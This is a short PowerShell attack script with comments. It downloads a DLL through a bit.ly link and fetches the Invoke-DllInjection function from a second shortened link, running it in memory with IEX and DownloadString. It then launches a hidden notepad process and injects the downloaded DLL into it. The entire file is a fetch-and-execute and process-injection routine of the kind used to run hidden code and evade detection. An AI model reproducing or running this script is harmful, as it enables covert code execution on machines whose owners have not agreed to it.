#download from github dll
(new-object System.Net.WebClient).DownloadFile('http://bit.ly/2iNZzKd','C:\temp\inject.dll')

#download from github Invoke-DllInjection
IEX (New-object Net.WebClient).Downloadstring("http://bit.ly/1WHjecJ") 

#start a notpade as hide prosses and store PID
$newproc = start-process -windowstyle hidden -filepath notepad.exe -passthru 

#execute dell injection with stored PID
Invoke-DllInjection -ProcessID $newproc.Id -Dll C:\temp\inject.dll
